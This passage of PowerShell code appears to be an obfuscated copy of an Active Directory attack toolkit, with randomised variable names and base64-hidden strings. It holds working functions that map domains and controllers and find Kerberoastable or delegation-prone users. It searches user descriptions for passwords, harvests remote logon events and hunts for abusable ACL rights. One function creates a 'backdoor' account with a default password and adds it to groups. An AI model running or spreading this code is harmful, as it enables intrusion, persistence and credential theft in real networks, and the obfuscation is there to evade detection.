    )
    process {
        if(${afa30c601e734738b32424a6234484e4}) {
            if(${afa30c601e734738b32424a6234484e4}.Contains('*')) {
                (Get-NetForest -b269a228f63c4b8fa8e609dcda3cbb66 ${b269a228f63c4b8fa8e609dcda3cbb66}).Domains | ? {$_.Name -like ${afa30c601e734738b32424a6234484e4}}
            }
            else {
                (Get-NetForest -b269a228f63c4b8fa8e609dcda3cbb66 ${b269a228f63c4b8fa8e609dcda3cbb66}).Domains | ? {$_.Name.ToLower() -eq ${afa30c601e734738b32424a6234484e4}.ToLower()}
            }
        }
        else {
            ${03fada381d26406b92573c72c987885d} = Get-NetForest -b269a228f63c4b8fa8e609dcda3cbb66 ${b269a228f63c4b8fa8e609dcda3cbb66}
            if(${03fada381d26406b92573c72c987885d}) {
                ${03fada381d26406b92573c72c987885d}.Domains
            }
        }
    }
}
function Get-NetForestCatalog {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${b269a228f63c4b8fa8e609dcda3cbb66}
    )
    process {
        ${03fada381d26406b92573c72c987885d} = Get-NetForest -b269a228f63c4b8fa8e609dcda3cbb66 ${b269a228f63c4b8fa8e609dcda3cbb66}
        if(${03fada381d26406b92573c72c987885d}) {
            ${03fada381d26406b92573c72c987885d}.FindAllGlobalCatalogs()
        }
    }
}
function Get-NetDomainController {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e22191a1db5b4c5bba42c2b9674b00a8}
    )
    process {
        if(${e22191a1db5b4c5bba42c2b9674b00a8} -or ${a3bf4f2494234d89b62febc9f379f624}) {
            Get-NetComputer -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c489e407a44b4d378d17e6f8021054c1 -a48507564a8248e5b01d3a563f4bc865 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
        }
        else {
            ${7c91682d6c48459fa2349d85055ca9e2} = Get-NetDomain -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}
            if(${7c91682d6c48459fa2349d85055ca9e2}) {
                ${7c91682d6c48459fa2349d85055ca9e2}.DomainControllers
            }
        }
    }
}
function Get-NetUser {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [Switch]
        ${a28200ed725246a29b1b7a8486b7f537},
        [Switch]
        ${c158a3a278cc485f9b7a13755fb2e250},
        [Switch]
        ${d94ab56af5434f32a3756027d2d13aa3},
        [Switch]
        ${a5828792c4a845028f178e4eb1f82d63},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${4f1777a77d1648df8dd39511adca89a3} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
    process {
        if(${4f1777a77d1648df8dd39511adca89a3}) {
            if(${d94ab56af5434f32a3756027d2d13aa3}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB1AG4AYwBvAG4AcwB0AHIAYQBpAG4AZQBkACAAZABlAGwAZQBnAGEAdABpAG8AbgA=')))
                ${a48507564a8248e5b01d3a563f4bc865} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADUAMgA0ADIAOAA4ACkA')))
            }
            if(${a5828792c4a845028f178e4eb1f82d63}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAGwAZQBnAGEAdABlAGQA')))
                ${a48507564a8248e5b01d3a563f4bc865} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4ADUANwA0ACkAKQA=')))
            }
            if(${c158a3a278cc485f9b7a13755fb2e250}) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                ${a48507564a8248e5b01d3a563f4bc865} += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if(${dfa85e24773f431f91e73de068d7b94e}) {
                ${4f1777a77d1648df8dd39511adca89a3}.filter="(&(samAccountType=805306368)(samAccountName=${dfa85e24773f431f91e73de068d7b94e})${a48507564a8248e5b01d3a563f4bc865})"
            }
            elseif(${a28200ed725246a29b1b7a8486b7f537}) {
                ${4f1777a77d1648df8dd39511adca89a3}.filter="(&(samAccountType=805306368)(servicePrincipalName=*)${a48507564a8248e5b01d3a563f4bc865})"
            }
            else {
                ${4f1777a77d1648df8dd39511adca89a3}.filter="(&(samAccountType=805306368)${a48507564a8248e5b01d3a563f4bc865})"
            }
            ${4f1777a77d1648df8dd39511adca89a3}.FindAll() | ? {$_} | % {
                Convert-LDAPProperty -d90960fc83614a2fb42f43ab6aac95a1 $_.Properties
            }
        }
    }
}
function Add-NetUser {
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${dfa85e24773f431f91e73de068d7b94e} = 'backdoor',
        [ValidateNotNullOrEmpty()]
        [String]
        ${aef4c3d20eff433590ff1b79e30c060b} = 'Password123!',
        [ValidateNotNullOrEmpty()]
        [String]
        ${a0852a4c33684bf0877105c6da3a9074},
        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = 'localhost',
        [ValidateNotNullOrEmpty()]
        [String]
        ${afa30c601e734738b32424a6234484e4}
    )
    if (${afa30c601e734738b32424a6234484e4}) {
        ${af274d0cf7414bb084ed57f88165d4e4} = Get-NetDomain -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}
        if(-not ${af274d0cf7414bb084ed57f88165d4e4}) {
            Write-Warning "Error in grabbing ${afa30c601e734738b32424a6234484e4} object"
            return $Null
        }
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
        ${192621936cfe4339ba4bedd340c0506e} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), ${af274d0cf7414bb084ed57f88165d4e4}
        ${d98950af3033419194b20c9afd35b025} = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ${192621936cfe4339ba4bedd340c0506e}
        ${d98950af3033419194b20c9afd35b025}.Name = ${dfa85e24773f431f91e73de068d7b94e}
        ${d98950af3033419194b20c9afd35b025}.SamAccountName = ${dfa85e24773f431f91e73de068d7b94e}
        ${d98950af3033419194b20c9afd35b025}.PasswordNotRequired = $False
        ${d98950af3033419194b20c9afd35b025}.SetPassword(${aef4c3d20eff433590ff1b79e30c060b})
        ${d98950af3033419194b20c9afd35b025}.Enabled = $True
        Write-Verbose "Creating user ${dfa85e24773f431f91e73de068d7b94e} to with password '${aef4c3d20eff433590ff1b79e30c060b}' in domain ${afa30c601e734738b32424a6234484e4}"
        try {
            ${d98950af3033419194b20c9afd35b025}.Save()
            "[*] User ${dfa85e24773f431f91e73de068d7b94e} successfully created in domain ${afa30c601e734738b32424a6234484e4}"
        }
        catch {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABVAHMAZQByACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzACEA')))
            return
        }
    }
    else {
        Write-Verbose "Creating user ${dfa85e24773f431f91e73de068d7b94e} to with password '${aef4c3d20eff433590ff1b79e30c060b}' on ${c096522c7bbe4c7aaadf99843e3b09fb}"
        ${7b761560693b420a98bf8d044f4c9e7f} = [ADSI]"WinNT://${c096522c7bbe4c7aaadf99843e3b09fb}"
        ${7b6ac1daa2bf41189f0b526043f3edf5} = ${7b761560693b420a98bf8d044f4c9e7f}.Create($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))), ${dfa85e24773f431f91e73de068d7b94e})
        ${7b6ac1daa2bf41189f0b526043f3edf5}.SetPassword(${aef4c3d20eff433590ff1b79e30c060b})
        try {
            $Null = ${7b6ac1daa2bf41189f0b526043f3edf5}.SetInfo()
            "[*] User ${dfa85e24773f431f91e73de068d7b94e} successfully created on host ${c096522c7bbe4c7aaadf99843e3b09fb}"
        }
        catch {
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABBAGMAYwBvAHUAbgB0ACAAYQBsAHIAZQBhAGQAeQAgAGUAeABpAHMAdABzACEA')))
            return
        }
    }
    if (${a0852a4c33684bf0877105c6da3a9074}) {
        if (${afa30c601e734738b32424a6234484e4}) {
            Add-NetGroupUser -dfa85e24773f431f91e73de068d7b94e ${dfa85e24773f431f91e73de068d7b94e} -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}
            "[*] User ${dfa85e24773f431f91e73de068d7b94e} successfully added to group ${a0852a4c33684bf0877105c6da3a9074} in domain ${afa30c601e734738b32424a6234484e4}"
        }
        else {
            Add-NetGroupUser -dfa85e24773f431f91e73de068d7b94e ${dfa85e24773f431f91e73de068d7b94e} -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
            "[*] User ${dfa85e24773f431f91e73de068d7b94e} successfully added to group ${a0852a4c33684bf0877105c6da3a9074} on host ${c096522c7bbe4c7aaadf99843e3b09fb}"
        }
    }
}
function Add-NetGroupUser {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${a0852a4c33684bf0877105c6da3a9074},
        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [String]
        ${afa30c601e734738b32424a6234484e4}
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    if(${c096522c7bbe4c7aaadf99843e3b09fb} -and (${c096522c7bbe4c7aaadf99843e3b09fb} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAGgAbwBzAHQA'))))) {
        try {
            Write-Verbose "Adding user ${dfa85e24773f431f91e73de068d7b94e} to ${a0852a4c33684bf0877105c6da3a9074} on host ${c096522c7bbe4c7aaadf99843e3b09fb}"
            ([ADSI]"WinNT://${c096522c7bbe4c7aaadf99843e3b09fb}/${a0852a4c33684bf0877105c6da3a9074},group").add("WinNT://${c096522c7bbe4c7aaadf99843e3b09fb}/${dfa85e24773f431f91e73de068d7b94e},user")
            "[*] User ${dfa85e24773f431f91e73de068d7b94e} successfully added to group ${a0852a4c33684bf0877105c6da3a9074} on ${c096522c7bbe4c7aaadf99843e3b09fb}"
        }
        catch {
            Write-Warning "[!] Error adding user ${dfa85e24773f431f91e73de068d7b94e} to group ${a0852a4c33684bf0877105c6da3a9074} on ${c096522c7bbe4c7aaadf99843e3b09fb}"
            return
        }
    }
    else {
        try {
            if (${afa30c601e734738b32424a6234484e4}) {
                Write-Verbose "Adding user ${dfa85e24773f431f91e73de068d7b94e} to ${a0852a4c33684bf0877105c6da3a9074} on domain ${afa30c601e734738b32424a6234484e4}"
                ${7e361f65be1149199bc50d5f5e44c66f} = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                ${af274d0cf7414bb084ed57f88165d4e4} = Get-NetDomain -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}
                if(-not ${af274d0cf7414bb084ed57f88165d4e4}) {
                    return $Null
                }
                ${192621936cfe4339ba4bedd340c0506e} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ${7e361f65be1149199bc50d5f5e44c66f}, ${af274d0cf7414bb084ed57f88165d4e4}            
            }
            else {
                Write-Verbose "Adding user ${dfa85e24773f431f91e73de068d7b94e} to ${a0852a4c33684bf0877105c6da3a9074} on localhost"
                ${192621936cfe4339ba4bedd340c0506e} = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, ${Env:c096522c7bbe4c7aaadf99843e3b09fb})
            }
            ${e84898b3b02d436697861293d1bb9448} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${192621936cfe4339ba4bedd340c0506e},${a0852a4c33684bf0877105c6da3a9074})
            ${e84898b3b02d436697861293d1bb9448}.Members.add(${192621936cfe4339ba4bedd340c0506e}, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, ${dfa85e24773f431f91e73de068d7b94e})
            ${e84898b3b02d436697861293d1bb9448}.Save()
        }
        catch {
            Write-Warning "Error adding ${dfa85e24773f431f91e73de068d7b94e} to ${a0852a4c33684bf0877105c6da3a9074} : $_"
        }
    }
}
function Get-UserProperty {
    [CmdletBinding()]
    param(
        [String[]]
        ${d90960fc83614a2fb42f43ab6aac95a1},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    if(${d90960fc83614a2fb42f43ab6aac95a1}) {
        ${d90960fc83614a2fb42f43ab6aac95a1} = ,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))) + ${d90960fc83614a2fb42f43ab6aac95a1}
        Get-NetUser -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | select -Property ${d90960fc83614a2fb42f43ab6aac95a1}
    }
    else {
        Get-NetUser -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | select -First 1 | gm -MemberType *Property | select -Property $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))
    }
}
function Find-UserField {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        ${ae2b48b0b86f414e9a06895d10c31dc2} = 'pass',
        [String]
        ${cafb48fc09ca44f7b238fde16d9ec320} = 'description',
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    process {
        Get-NetUser -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -a48507564a8248e5b01d3a563f4bc865 "(${cafb48fc09ca44f7b238fde16d9ec320}=*${ae2b48b0b86f414e9a06895d10c31dc2}*)" -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | select samaccountname,${cafb48fc09ca44f7b238fde16d9ec320}
    }
}
function Get-UserEvent {
    Param(
        [String]
        ${c096522c7bbe4c7aaadf99843e3b09fb} = ${Env:c096522c7bbe4c7aaadf99843e3b09fb},
        [String]
        [ValidateSet("logon","tgt","all")]
        ${a0311454eba740dfa486807a9ce23992} = "logon",
        [DateTime]
        ${ee5488d91a354beea34a223ead095cdb}=[DateTime]::Today.AddDays(-5)
    )
    if(${a0311454eba740dfa486807a9ce23992}.ToLower() -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAA==')))) {
        [Int32[]]$ID = @(4624)
    }
    elseif(${a0311454eba740dfa486807a9ce23992}.ToLower() -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABnAHQA')))) {
        [Int32[]]$ID = @(4768)
    }
    else {
        [Int32[]]$ID = @(4624, 4768)
    }
    Get-WinEvent -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -FilterHashTable @{ LogName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA=='))); ID=$ID; StartTime=${ee5488d91a354beea34a223ead095cdb}} -ErrorAction SilentlyContinue | % {
        if($ID -contains 4624) {    
            if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AEwAbwBnAG8AbgAgAFQAeQBwAGUAOgApAC4AKgA/ACgAPwA9ACgASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgAgAEwAZQB2AGUAbAA6AHwATgBlAHcAIABMAG8AZwBvAG4AOgApACkA')))) {
                if(${9f85a745386045a3a1f14070f7c08003}) {
                    ${8b3c2e0039154131b15ca777a84fc169} = ${9f85a745386045a3a1f14070f7c08003}[0].trim()
                    ${9f85a745386045a3a1f14070f7c08003} = $Null
                }
            }
            else {
                ${8b3c2e0039154131b15ca777a84fc169} = ""
            }
            if ((${8b3c2e0039154131b15ca777a84fc169} -eq 2) -or (${8b3c2e0039154131b15ca777a84fc169} -eq 3)) {
                try {
                    if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB3ACAATABvAGcAbwBuADoAKQAuACoAPwAoAD8APQBQAHIAbwBjAGUAcwBzACAASQBuAGYAbwByAG0AYQB0AGkAbwBuADoAKQA=')))) {
                        if(${9f85a745386045a3a1f14070f7c08003}) {
                            ${dfa85e24773f431f91e73de068d7b94e} = ${9f85a745386045a3a1f14070f7c08003}[0].split("`n")[2].split(":")[1].trim()
                            ${afa30c601e734738b32424a6234484e4} = ${9f85a745386045a3a1f14070f7c08003}[0].split("`n")[3].split(":")[1].trim()
                            ${9f85a745386045a3a1f14070f7c08003} = $Null
                        }
                    }
                    if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB0AHcAbwByAGsAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AFMAbwB1AHIAYwBlACAAUABvAHIAdAA6ACkA')))) {
                        if(${9f85a745386045a3a1f14070f7c08003}) {
                            ${09c7f7bcb4c94b58a271dc47a647fea3} = ${9f85a745386045a3a1f14070f7c08003}[0].split("`n")[2].split(":")[1].trim()
                            ${9f85a745386045a3a1f14070f7c08003} = $Null
                        }
                    }
                    if (${dfa85e24773f431f91e73de068d7b94e} -and (-not ${dfa85e24773f431f91e73de068d7b94e}.endsWith('$')) -and (${dfa85e24773f431f91e73de068d7b94e} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBOAE8ATgBZAE0ATwBVAFMAIABMAE8ARwBPAE4A'))))) {
                        ${10d3244f244047338c3411ea30d0e6e8} = @{
                            'Domain' = ${afa30c601e734738b32424a6234484e4}
                            'ComputerName' = ${c096522c7bbe4c7aaadf99843e3b09fb}
                            'Username' = ${dfa85e24773f431f91e73de068d7b94e}
                            'Address' = ${09c7f7bcb4c94b58a271dc47a647fea3}
                            'ID' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA2ADIANAA=')))
                            'LogonType' = ${8b3c2e0039154131b15ca777a84fc169}
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property ${10d3244f244047338c3411ea30d0e6e8}
                    }
                }
                catch {
                    Write-Debug "Error parsing event logs: $_"
                }
            }
        }
        if($ID -contains 4768) {
            try {
                if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AEEAYwBjAG8AdQBuAHQAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AFMAZQByAHYAaQBjAGUAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAA==')))) {
                    if(${9f85a745386045a3a1f14070f7c08003}) {
                        ${dfa85e24773f431f91e73de068d7b94e} = ${9f85a745386045a3a1f14070f7c08003}[0].split("`n")[1].split(":")[1].trim()
                        ${afa30c601e734738b32424a6234484e4} = ${9f85a745386045a3a1f14070f7c08003}[0].split("`n")[2].split(":")[1].trim()
                        ${9f85a745386045a3a1f14070f7c08003} = $Null
                    }
                }
                if($_.message -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAA/AHMAKQAoAD8APAA9AE4AZQB0AHcAbwByAGsAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAC4AKgA/ACgAPwA9AEEAZABkAGkAdABpAG8AbgBhAGwAIABJAG4AZgBvAHIAbQBhAHQAaQBvAG4AOgApAA==')))) {
                    if(${9f85a745386045a3a1f14070f7c08003}) {
                        ${09c7f7bcb4c94b58a271dc47a647fea3} = ${9f85a745386045a3a1f14070f7c08003}[0].split("`n")[1].split(":")[-1].trim()
                        ${9f85a745386045a3a1f14070f7c08003} = $Null
                    }
                }
                ${10d3244f244047338c3411ea30d0e6e8} = @{
                    'Domain' = ${afa30c601e734738b32424a6234484e4}
                    'ComputerName' = ${c096522c7bbe4c7aaadf99843e3b09fb}
                    'Username' = ${dfa85e24773f431f91e73de068d7b94e}
                    'Address' = ${09c7f7bcb4c94b58a271dc47a647fea3}
                    'ID' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA3ADYAOAA=')))
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }
                New-Object -TypeName PSObject -Property ${10d3244f244047338c3411ea30d0e6e8}
            }
            catch {
                Write-Debug "Error parsing event logs: $_"
            }
        }
    }
}
function Get-ObjectAcl {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        ${a7648af93b714896863ad23fbb505ae4},
        [String]
        ${be2d982dffb8435b9bc6f279ce7309a8} = "*",
        [Alias('DN')]
        [String]
        ${e43ac2d547a843e5940f7f80752eb771} = "*",
        [Switch]
        ${e5518a7ba66f4646a3d1f66f67f92148},
        [String]
        ${a48507564a8248e5b01d3a563f4bc865},
        [String]
        ${c4d5e29aa5ae43dc97a75d43cbc64f02},
        [String]
        ${bbc4680c371c4b70bf799c47787e7f27},
        [String]
        [ValidateSet("All","ResetPassword","WriteMembers")]
        ${b1a36fd947d44e81ad93e4b76cf3fb16},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    begin {
        ${7a1a8a62c2a9413989ed82181fa823b4} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4d5e29aa5ae43dc97a75d43cbc64f02} -bbc4680c371c4b70bf799c47787e7f27 ${bbc4680c371c4b70bf799c47787e7f27} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        if(${e5518a7ba66f4646a3d1f66f67f92148}) {
            ${e0768b3aa518442587ee8f1d4323f5aa} = Get-GUIDMap -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        }
    }
    process {
        if (${7a1a8a62c2a9413989ed82181fa823b4}) {
            if(${a7648af93b714896863ad23fbb505ae4}) {
                ${7a1a8a62c2a9413989ed82181fa823b4}.filter="(&(samaccountname=${a7648af93b714896863ad23fbb505ae4})(name=${be2d982dffb8435b9bc6f279ce7309a8})(distinguishedname=${e43ac2d547a843e5940f7f80752eb771})${a48507564a8248e5b01d3a563f4bc865})"  
            }
            else {
                ${7a1a8a62c2a9413989ed82181fa823b4}.filter="(&(name=${be2d982dffb8435b9bc6f279ce7309a8})(distinguishedname=${e43ac2d547a843e5940f7f80752eb771})${a48507564a8248e5b01d3a563f4bc865})"  
            }
            try {
                ${7a1a8a62c2a9413989ed82181fa823b4}.FindAll() | ? {$_} | Foreach-Object {
                    ${b2929ecf6cd74a84bce9ccd2f5622fbb} = [adsi]($_.path)
                    if(${b2929ecf6cd74a84bce9ccd2f5622fbb}.distinguishedname) {
                        ${e2580a675bdd454da8d476e3dbdd4068} = ${b2929ecf6cd74a84bce9ccd2f5622fbb}.PsBase.ObjectSecurity.access
                        ${e2580a675bdd454da8d476e3dbdd4068} | % {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) (${b2929ecf6cd74a84bce9ccd2f5622fbb}.distinguishedname[0])
                            if(${b2929ecf6cd74a84bce9ccd2f5622fbb}.objectsid[0]){
                                ${97bd3474a86243debb2dc0ba0e37d49e} = (New-Object System.Security.Principal.SecurityIdentifier(${b2929ecf6cd74a84bce9ccd2f5622fbb}.objectsid[0],0)).Value
                            }
                            else {
                                ${97bd3474a86243debb2dc0ba0e37d49e} = $Null
                            }
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${97bd3474a86243debb2dc0ba0e37d49e}
                            $_
                        }
                    }
                } | % {
                    if(${b1a36fd947d44e81ad93e4b76cf3fb16}) {
                        ${005ee00091f64e30b4e10cd3f0a1f97c} = Switch (${b1a36fd947d44e81ad93e4b76cf3fb16}) {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                            Default { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA')))}
                        }
                        if($_.ObjectType -eq ${005ee00091f64e30b4e10cd3f0a1f97c}) { $_ }
                    }
                    else {
                        $_
                    }
                } | Foreach-Object {
                    if(${e0768b3aa518442587ee8f1d4323f5aa}) {
                        ${fd32de5e9cbc46439e4ffecef0e84950} = @{}
                        $_.psobject.properties | % {
                            if( ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQA=')))) -or ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGgAZQByAGkAdABlAGQATwBiAGoAZQBjAHQAVAB5AHAAZQA=')))) ) {
                                try {
                                    ${fd32de5e9cbc46439e4ffecef0e84950}[$_.Name] = ${e0768b3aa518442587ee8f1d4323f5aa}[$_.Value.toString()]
                                }
                                catch {
                                    ${fd32de5e9cbc46439e4ffecef0e84950}[$_.Name] = $_.Value
                                }
                            }
                            else {
